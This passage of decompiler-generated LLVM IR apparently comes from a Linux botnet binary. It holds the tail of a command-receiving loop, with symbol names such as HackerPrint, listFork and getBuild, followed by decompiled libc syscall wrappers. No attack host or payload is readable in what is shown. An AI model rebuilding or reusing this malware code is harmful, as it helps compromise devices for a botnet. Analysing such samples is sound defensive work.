dec_label_pc_805f448.lr.ph:                       ; preds = %dec_label_pc_805f420
  br label %dec_label_pc_805f448

dec_label_pc_805f448:                             ; preds = %dec_label_pc_805f448.lr.ph, %dec_label_pc_805f448
  %storemerge139 = phi i32 [ 1, %dec_label_pc_805f448.lr.ph ], [ %v4_805f457, %dec_label_pc_805f448 ]
  %v0_805f44b = load i32, i32* @ebp, align 4
  %v2_805f44b = mul i32 %storemerge139, 4
  %v3_805f44b = add i32 %v2_805f44b, -116
  %v4_805f44b = add i32 %v3_805f44b, %v0_805f44b
  %v5_805f44b = inttoptr i32 %v4_805f44b to i32*
  %v6_805f44b = load i32, i32* %v5_805f44b, align 4
  %v4_805f44f = inttoptr i32 %v6_805f44b to i8*
  store i8* %v4_805f44f, i8** %stack_var_-36976, align 4
  %v2_805f452 = call i32 @free(i32 %v6_805f44b)
  %v4_805f457 = add nuw i32 %storemerge139, 1
  %exitcond = icmp eq i32 %v4_805f457, %stack_var_-32.1.lcssa
  br i1 %exitcond, label %dec_label_pc_805f463, label %dec_label_pc_805f448

dec_label_pc_805f463:                             ; preds = %dec_label_pc_805f448, %dec_label_pc_805f420, %dec_label_pc_805f298, %dec_label_pc_805f1a5, %dec_label_pc_805f16b, %dec_label_pc_805f123, %dec_label_pc_805ee85
  %v0_805f469 = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805f469 = ptrtoint i8* %v0_805f469 to i32
  store i8* %v0_805f469, i8** %stack_var_-36976, align 4
  %v7_805f47e = call i32 @recvLine(i32 %v1_805f469, i8* %tmp84, i32 4096)
  %v13_805f486 = icmp eq i32 %v7_805f47e, -1
  %v1_805f48a = icmp eq i1 %v13_805f486, false
  br i1 %v1_805f48a, label %dec_label_pc_805f08b, label %dec_label_pc_805ee6e

; uselistorder directives
  uselistorder i32 %storemerge139, { 1, 0 }
  uselistorder i32 %stack_var_-32.128, { 0, 3, 2, 1 }
  uselistorder i8* %v3_805f3a2, { 2, 1, 0 }
  uselistorder i32 %v5_805f2f3, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge12, { 1, 0 }
  uselistorder i32 %v5_805f26f, { 1, 0 }
  uselistorder i32 %v1_805f268, { 1, 0 }
  uselistorder i8* %storemerge12126, { 1, 0 }
  uselistorder i32 %v1_805f1f2, { 2, 1, 0 }
  uselistorder i8* %v5_805f1d3, { 6, 5, 0, 3, 1, 2, 4, 8, 7, 12, 11, 10, 9 }
  uselistorder i32 %v1_805f1d0, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %storemerge13.lcssa, { 1, 0 }
  uselistorder i32 %v0_805f0a4, { 1, 0, 2 }
  uselistorder i32 %storemerge14, { 2, 3, 0, 1 }
  uselistorder i32 %storemerge15, { 1, 0, 2 }
  uselistorder i32 %v2_805effc, { 1, 0 }
  uselistorder i32 %v2_805efe8, { 1, 0 }
  uselistorder i32 %v2_805efe2, { 1, 0 }
  uselistorder i32 %v0_805efb1, { 0, 2, 1 }
  uselistorder i32 %storemerge16, { 1, 2, 0, 3 }
  uselistorder i32 %v2_805ef26, { 1, 0 }
  uselistorder i32 %v0_805ef1b, { 1, 0 }
  uselistorder i8* %tmp86, { 5, 2, 1, 4, 3, 0, 6, 7, 8, 9 }
  uselistorder i32 %v2_805f2b5, { 1, 0, 2, 3 }
  uselistorder i8* %v5_805f1bf, { 4, 3, 0, 1, 2 }
  uselistorder i8* %tmp84, { 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_805f463, { 2, 0, 4, 5, 1, 6, 7, 3 }
  uselistorder i32 %v2_805edf5, { 2, 1, 0, 3 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i8** %stack_var_-36976, { 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 0, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 53, 13, 12, 54, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i8** %stack_var_-28, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 7, 0, 6, 1, 5, 2, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @szprintf, { 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35 }
  uselistorder i32 32676, { 2, 1, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 ()* @listFork, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @HackerPrint, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 21, 20, 0 }
  uselistorder i8** @global_var_8071b40.30, { 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @sleep, { 2, 1, 0 }
  uselistorder i32* @global_var_806e871.1549, { 1, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 ()* @__getpid, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20, 1, 2, 3, 4, 5, 6, 7, 21, 22 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @getBuild, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805f448, { 1, 0 }
  uselistorder label %dec_label_pc_805f3ff, { 1, 0 }
  uselistorder label %dec_label_pc_805f395, { 1, 0 }
  uselistorder label %dec_label_pc_805f36d, { 1, 0 }
  uselistorder label %dec_label_pc_805f2fd, { 1, 0 }
  uselistorder label %dec_label_pc_805f257, { 1, 0 }
  uselistorder label %dec_label_pc_805f245, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805f23b, { 1, 0 }
  uselistorder label %dec_label_pc_805f1ef, { 1, 0 }
  uselistorder label %dec_label_pc_805f1a5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805f19b, { 1, 0 }
  uselistorder label %dec_label_pc_805f16b, { 1, 0 }
  uselistorder label %dec_label_pc_805f087, { 1, 0 }
  uselistorder label %dec_label_pc_805f01c, { 1, 0 }
  uselistorder label %dec_label_pc_805eff9, { 1, 0 }
  uselistorder label %dec_label_pc_805ef44, { 1, 0 }
  uselistorder label %dec_label_pc_805ef1b, { 1, 0 }
  uselistorder label %dec_label_pc_805ee6e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805ee49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805ed0b, { 1, 0 }
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_805f4ab = add i32 %arg2, -12
  %v6_805f4b1 = icmp ugt i32 %v1_805f4ab, 2
  br i1 %v6_805f4b1, label %dec_label_pc_805f4c4, label %dec_label_pc_805f4b3

dec_label_pc_805f4b3:                             ; preds = %entry
  %v1_805f4bf = call i32 @int80_syscall(i32 221)
  br label %dec_label_pc_805f4d3

dec_label_pc_805f4c4:                             ; preds = %entry
  %v2_805f4d0 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  br label %dec_label_pc_805f4d3

dec_label_pc_805f4d3:                             ; preds = %dec_label_pc_805f4b3, %dec_label_pc_805f4c4
  %v0_805f4e2 = phi i32 [ %v1_805f4bf, %dec_label_pc_805f4b3 ], [ %v2_805f4d0, %dec_label_pc_805f4c4 ]
  %tmp = icmp ult i32 %v0_805f4e2, -4095
  br i1 %tmp, label %dec_label_pc_805f4ea, label %dec_label_pc_805f4dd

dec_label_pc_805f4dd:                             ; preds = %dec_label_pc_805f4d3
  %v1_805f4e2 = sub i32 0, %v0_805f4e2
  store i32 %v1_805f4e2, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805f4ea

dec_label_pc_805f4ea:                             ; preds = %dec_label_pc_805f4d3, %dec_label_pc_805f4dd
  %v0_805f4ed = phi i32 [ %v0_805f4e2, %dec_label_pc_805f4d3 ], [ -1, %dec_label_pc_805f4dd ]
  ret i32 %v0_805f4ed

; uselistorder directives
  uselistorder i32 %v0_805f4e2, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805f4ea, { 1, 0 }
  uselistorder label %dec_label_pc_805f4d3, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %v0_805f4ef = load i32, i32* @esi, align 4
  %v0_805f4f0 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v0_805f500 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_805f506 = icmp eq i32 %v0_805f500, 0
  br i1 %v1_805f506, label %dec_label_pc_805f518, label %dec_label_pc_805f50a

dec_label_pc_805f50a:                             ; preds = %entry
  %v12_805f50a = icmp eq i32 %arg2, 7
  br i1 %v12_805f50a, label %dec_label_pc_805f546, label %dec_label_pc_805f511

dec_label_pc_805f511:                             ; preds = %dec_label_pc_805f50a
  %v12_805f511 = icmp eq i32 %arg2, 14
  br i1 %v12_805f511, label %dec_label_pc_805f546, label %dec_label_pc_805f518

dec_label_pc_805f518:                             ; preds = %dec_label_pc_805f511, %entry
  store i32 %arg3, i32* @edx, align 4
  %v1_805f52a = call i32 @int80_syscall(i32 221)
  %tmp = icmp ult i32 %v1_805f52a, -4095
  br i1 %tmp, label %dec_label_pc_805f583, label %dec_label_pc_805f537

dec_label_pc_805f537:                             ; preds = %dec_label_pc_805f518
  %v1_805f53c = sub i32 0, %v1_805f52a
  store i32 %v1_805f53c, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805f583

dec_label_pc_805f546:                             ; preds = %dec_label_pc_805f511, %dec_label_pc_805f50a
  %v4_805f546 = call i32 @__libc_enable_asynccancel(i32 %tmp6, i32 %tmp8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_805f54f = load i32, i32* @ebx, align 4
  store i32 %v0_805f54f, i32* @edx, align 4
  store i32 %v4_805f546, i32* %edi.global-to-local, align 4
  %v1_805f55f = call i32 @int80_syscall(i32 221)
  store i32 %v1_805f55f, i32* @ebx, align 4
  %tmp12 = icmp ult i32 %v1_805f55f, -4095
  br i1 %tmp12, label %dec_label_pc_805f57a, label %dec_label_pc_805f56d

dec_label_pc_805f56d:                             ; preds = %dec_label_pc_805f546
  %v1_805f572 = sub i32 0, %v1_805f55f
  store i32 -1, i32* @ebx, align 4
  store i32 %v1_805f572, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805f57a

dec_label_pc_805f57a:                             ; preds = %dec_label_pc_805f546, %dec_label_pc_805f56d
  %v0_805f57a = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_805f57a, i32* @eax, align 4
  %v1_805f57c = call i32 @__libc_disable_asynccancel(i32 %v0_805f54f)
  %v0_805f581 = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805f583

dec_label_pc_805f583:                             ; preds = %dec_label_pc_805f518, %dec_label_pc_805f537, %dec_label_pc_805f57a
  %v0_805f589 = phi i32 [ %v1_805f52a, %dec_label_pc_805f518 ], [ -1, %dec_label_pc_805f537 ], [ %v0_805f581, %dec_label_pc_805f57a ]
  store i32 %v0_805f4f0, i32* @ebx, align 4
  store i32 %v0_805f4ef, i32* @esi, align 4
  ret i32 %v0_805f589

; uselistorder directives
  uselistorder i32 %v1_805f55f, { 1, 0, 2 }
  uselistorder i32 %v1_805f52a, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805f583, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805f57a, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  store i32 -8, i32* %ecx.global-to-local, align 4
  %v1_805f59e = call i32 @int80_syscall(i32 252)
  store i32 -8, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805f5a2 = add i32 %v1_805f59e, 4096
  %v2_805f5a2 = icmp ult i32 %v1_805f59e, -4096
  %v3_805f5a2 = xor i32 %v1_805f59e, -2147483648
  %v4_805f5a2 = xor i32 %v1_805f5a2, %v1_805f59e
  %v5_805f5a2 = and i32 %v4_805f5a2, %v3_805f5a2
  %v6_805f5a2 = icmp slt i32 %v5_805f5a2, 0
  store i1 %v6_805f5a2, i1* @of, align 1
  %v7_805f5a2 = icmp eq i32 %v1_805f5a2, 0
  %v8_805f5a2 = icmp slt i32 %v1_805f5a2, 0
  store i1 %v8_805f5a2, i1* @sf, align 1
  store i32 %v1_805f59e, i32* @edx, align 4
  %v2_805f5a9 = or i1 %v2_805f5a2, %v7_805f5a2
  br i1 %v2_805f5a9, label %dec_label_pc_805f5b5, label %dec_label_pc_805f5ab

dec_label_pc_805f5ab:                             ; preds = %entry
  %v1_805f5b0 = sub i32 0, %v1_805f59e
  store i1 false, i1* @of, align 1
  %v7_805f5b0 = icmp slt i32 %v1_805f5b0, 0
  store i1 %v7_805f5b0, i1* @sf, align 1
  store i32 %v1_805f5b0, i32* @edx, align 4
  store i32 %v1_805f5b0, i32* inttoptr (i32 -8 to i32*), align 8
  %v0_805f5b5.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805f5b5.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805f5b5

dec_label_pc_805f5b5:                             ; preds = %entry, %dec_label_pc_805f5ab
  %v1_805f5b5 = phi i32 [ %arg1, %entry ], [ %v1_805f5b5.pre, %dec_label_pc_805f5ab ]
  %v0_805f5b5 = phi i32 [ -8, %entry ], [ %v0_805f5b5.pre, %dec_label_pc_805f5ab ]
  store i32 %v1_805f5b5, i32* @ebx, align 4
  store i32 %v0_805f5b5, i32* @ecx, align 4
  call void @exit(i32 %v1_805f5b5)
  unreachable

; uselistorder directives
  uselistorder i32 %v1_805f5b5, { 1, 0 }
  uselistorder i32 %v1_805f5a2, { 2, 1, 0 }
  uselistorder i32 %v1_805f59e, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805f5b5, { 1, 0 }
}

define i32 @access(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_805f5d8 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805f5df = call i32 @access(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_805f5d8, i32* @ebx, align 4
  %tmp = icmp ult i32 %v2_805f5df, -4095
  br i1 %tmp, label %dec_label_pc_805f5fa, label %dec_label_pc_805f5ed

dec_label_pc_805f5ed:                             ; preds = %entry
  %v1_805f5f2 = sub i32 0, %v2_805f5df
  store i32 %v1_805f5f2, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805f5fa

dec_label_pc_805f5fa:                             ; preds = %entry, %dec_label_pc_805f5ed
  %v0_805f5fa = phi i32 [ %v2_805f5df, %entry ], [ -1, %dec_label_pc_805f5ed ]
  ret i32 %v0_805f5fa

; uselistorder directives
  uselistorder i32 %v2_805f5df, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @access, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805f5fa, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v1_805f607 = call i32 @chdir(i32 ptrtoint (i32* @0 to i32))
  %v0_805f609 = load i32, i32* @ebx, align 4
  %v1_805f609 = load i32, i32* @ecx, align 4
  store i32 %v1_805f609, i32* @ebx, align 4
  store i32 %v0_805f609, i32* @ecx, align 4
  %tmp = icmp ult i32 %v1_805f607, -4095
  br i1 %tmp, label %dec_label_pc_805f622, label %dec_label_pc_805f615

dec_label_pc_805f615:                             ; preds = %entry
  %v1_805f61a = sub i32 0, %v1_805f607
  store i32 %v1_805f61a, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805f622

dec_label_pc_805f622:                             ; preds = %entry, %dec_label_pc_805f615
  %v0_805f622 = phi i32 [ %v1_805f607, %entry ], [ -1, %dec_label_pc_805f615 ]
  ret i32 %v0_805f622

; uselistorder directives
  uselistorder i32 %v1_805f607, { 1, 2, 0 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder label %dec_label_pc_805f622, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_805f62c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805f633 = call i32 @dup2(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_805f62c, i32* @ebx, align 4
  %tmp = icmp ult i32 %v2_805f633, -4095
  br i1 %tmp, label %dec_label_pc_805f64e, label %dec_label_pc_805f641

dec_label_pc_805f641:                             ; preds = %entry
  %v1_805f646 = sub i32 0, %v2_805f633
  store i32 %v1_805f646, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805f64e

dec_label_pc_805f64e:                             ; preds = %entry, %dec_label_pc_805f641
  %v0_805f64e = phi i32 [ %v2_805f633, %entry ], [ -1, %dec_label_pc_805f641 ]
  ret i32 %v0_805f64e

; uselistorder directives
  uselistorder i32 %v2_805f633, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805f64e, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_805f653 = ptrtoint i32* %stack_var_-8 to i32
  %v2_805f65a = call i32 @getrlimit(i32 7, i32 %v2_805f653)
  %v2_805f667 = icmp slt i32 %v2_805f65a, 0
  br i1 %v2_805f667, label %dec_label_pc_805f66f, label %dec_label_pc_805f66b

dec_label_pc_805f66b:                             ; preds = %entry
  %v3_805f66b = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805f66f

dec_label_pc_805f66f:                             ; preds = %entry, %dec_label_pc_805f66b
  %v0_805f66f = phi i32 [ 256, %entry ], [ %v3_805f66b, %dec_label_pc_805f66b ]
  ret i32 %v0_805f66f

; uselistorder directives
  uselistorder label %dec_label_pc_805f66f, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_805f67d = call i32 @int80_syscall(i32 201)
  ret i32 %v1_805f67d
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @ecx, align 4
  %v0_805f688 = load i32, i32* @ebx, align 4
  %v1_805f68f = call i32 @int80_syscall(i32 191)
  store i32 %v0_805f688, i32* @ebx, align 4
  %tmp = icmp ult i32 %v1_805f68f, -4095
  br i1 %tmp, label %dec_label_pc_805f6aa, label %dec_label_pc_805f69d

dec_label_pc_805f69d:                             ; preds = %entry
  %v1_805f6a2 = sub i32 0, %v1_805f68f
  store i32 %v1_805f6a2, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805f6aa

dec_label_pc_805f6aa:                             ; preds = %entry, %dec_label_pc_805f69d
  %v0_805f6aa = phi i32 [ %v1_805f68f, %entry ], [ -1, %dec_label_pc_805f69d ]
  ret i32 %v0_805f6aa

; uselistorder directives
  uselistorder i32 %v1_805f68f, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805f6aa, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_16 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-28, align 4
  %v0_805f6ac = load i32, i32* @edi, align 4
  %v0_805f6ad = load i32, i32* @esi, align 4
  %v0_805f6ae = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v0_805f6be = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_805f6c4 = icmp eq i32 %v0_805f6be, 0
  %v1_805f6c6 = icmp eq i1 %v1_805f6c4, false
  br i1 %v1_805f6c6, label %dec_label_pc_805f6f6, label %dec_label_pc_805f6c8

dec_label_pc_805f6c8:                             ; preds = %entry
  store i32 %arg1, i32* @ebx, align 4
  %v3_805f6da = call i32 @ioctl(i32 %arg3, i32 %tmp8, i32 ptrtoint (i32* @0 to i32))
  %tmp = icmp ult i32 %v3_805f6da, -4095
  br i1 %tmp, label %dec_label_pc_805f733, label %dec_label_pc_805f6e7

dec_label_pc_805f6e7:                             ; preds = %dec_label_pc_805f6c8
  %v1_805f6ec = sub i32 0, %v3_805f6da
  store i32 %v1_805f6ec, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805f733

dec_label_pc_805f6f6:                             ; preds = %entry
  %v2_805f6b2 = ptrtoint i32* %stack_var_16 to i32
  %v4_805f6f6 = call i32 @__libc_enable_asynccancel(i32 %v2_805f6b2, i32 %v0_805f6ae, i32 %v0_805f6ad, i32 %v0_805f6ac)
  %v0_805f6ff = load i32, i32* @ebx, align 4
  store i32 %v4_805f6f6, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805f70f = load i32, i32* %stack_var_-28, align 4
  %v3_805f70f = call i32 @ioctl(i32 %v0_805f6ff, i32 %v1_805f70f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805f70f, i32* @ebx, align 4
  %tmp12 = icmp ult i32 %v3_805f70f, -4095
  br i1 %tmp12, label %dec_label_pc_805f72a, label %dec_label_pc_805f71d

dec_label_pc_805f71d:                             ; preds = %dec_label_pc_805f6f6
  %v1_805f722 = sub i32 0, %v3_805f70f
  store i32 -1, i32* @ebx, align 4
  store i32 %v1_805f722, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805f72a

dec_label_pc_805f72a:                             ; preds = %dec_label_pc_805f6f6, %dec_label_pc_805f71d
  %v0_805f72a = load i32, i32* @edi, align 4
  store i32 %v0_805f72a, i32* @eax, align 4
  %v1_805f72c = call i32 @__libc_disable_asynccancel(i32 %v0_805f6ff)
  %v0_805f731 = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805f733

dec_label_pc_805f733:                             ; preds = %dec_label_pc_805f6c8, %dec_label_pc_805f6e7, %dec_label_pc_805f72a
  %v0_805f739 = phi i32 [ %v3_805f6da, %dec_label_pc_805f6c8 ], [ -1, %dec_label_pc_805f6e7 ], [ %v0_805f731, %dec_label_pc_805f72a ]
  store i32 %v0_805f6ae, i32* @ebx, align 4
  store i32 %v0_805f6ad, i32* @esi, align 4
  store i32 %v0_805f6ac, i32* @edi, align 4
  ret i32 %v0_805f739

; uselistorder directives
  uselistorder i32 %v3_805f70f, { 1, 0, 2 }
  uselistorder i32 %v3_805f6da, { 1, 2, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805f733, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805f72a, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v2_805f74b = call i32 @kill(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_805f74d = load i32, i32* @edx, align 4
  store i32 %v1_805f74d, i32* @ebx, align 4
  store i32 %v2_805f74b, i32* @edx, align 4
  %tmp = icmp ult i32 %v2_805f74b, -4095
  br i1 %tmp, label %dec_label_pc_805f766, label %dec_label_pc_805f759

dec_label_pc_805f759:                             ; preds = %entry
  %v1_805f75e = sub i32 0, %v2_805f74b
  store i32 %v1_805f75e, i32* @edx, align 4
  store i32 %v1_805f75e, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805f766

dec_label_pc_805f766:                             ; preds = %entry, %dec_label_pc_805f759
  %v0_805f766 = phi i32 [ %v2_805f74b, %entry ], [ -1, %dec_label_pc_805f759 ]
  ret i32 %v0_805f766

; uselistorder directives
  uselistorder i32 %v2_805f74b, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_805f766, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805f76c = load i32, i32* @ebx, align 4
  %v1_805f773 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_805f773 = call i32 @pipe([2 x i32] %v1_805f773)
  store i32 %v0_805f76c, i32* @ebx, align 4
  %tmp = icmp ult i32 %v2_805f773, -4095
  br i1 %tmp, label %dec_label_pc_805f78e, label %dec_label_pc_805f781

dec_label_pc_805f781:                             ; preds = %entry
  %v1_805f786 = sub i32 0, %v2_805f773
  store i32 %v1_805f786, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805f78e

dec_label_pc_805f78e:                             ; preds = %entry, %dec_label_pc_805f781
  %v0_805f78e = phi i32 [ %v2_805f773, %entry ], [ -1, %dec_label_pc_805f781 ]
  ret i32 %v0_805f78e

; uselistorder directives
  uselistorder i32 %v2_805f773, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805f78e, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_805f790 = load i32, i32* @edi, align 4
  %v0_805f791 = load i32, i32* @esi, align 4
  store i32 %v0_805f791, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_805f7a6 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v5_805f7ae = call i32 @prctl(i32 %v0_805f7a6, i32 %v0_805f791, i32 %v0_805f790, i32 %tmp6, i32 %arg1)
  store i32 %v0_805f7a6, i32* @ebx, align 4
  %tmp = icmp ult i32 %v5_805f7ae, -4095
  br i1 %tmp, label %dec_label_pc_805f7c8, label %dec_label_pc_805f7bb

dec_label_pc_805f7bb:                             ; preds = %entry
  %v1_805f7c0 = sub i32 0, %v5_805f7ae
  store i32 %v1_805f7c0, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805f7c8

dec_label_pc_805f7c8:                             ; preds = %entry, %dec_label_pc_805f7bb
  %v0_805f7ca = phi i32 [ %v5_805f7ae, %entry ], [ -1, %dec_label_pc_805f7bb ]
  %v2_805f7c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805f7c8, i32* @esi, align 4
  store i32 %v0_805f790, i32* @edi, align 4
  ret i32 %v0_805f7ca

; uselistorder directives
  uselistorder i32 %v5_805f7ae, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805f7c8, { 1, 0 }
}

define i32 @__syscall_select(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v0_805f7cf = load i32, i32* @ebx, align 4
  store i32 %v0_805f7cf, i32* %stack_var_-16, align 4
  %v1_805f7e6 = call i32 @int80_syscall(i32 142)
  %tmp = icmp ult i32 %v1_805f7e6, -4095
  br i1 %tmp, label %dec_label_pc_805f800, label %dec_label_pc_805f7f3

dec_label_pc_805f7f3:                             ; preds = %entry
  %v1_805f7f8 = sub i32 0, %v1_805f7e6
  store i32 %v1_805f7f8, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805f800

dec_label_pc_805f800:                             ; preds = %entry, %dec_label_pc_805f7f3
  %v0_805f804 = phi i32 [ %v1_805f7e6, %entry ], [ -1, %dec_label_pc_805f7f3 ]
  %v2_805f800 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805f800, i32* @ebx, align 4
  ret i32 %v0_805f804

; uselistorder directives
  uselistorder i32 %v1_805f7e6, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805f800, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_805f805 = load i32, i32* @ebp, align 4
  %v0_805f806 = load i32, i32* @edi, align 4
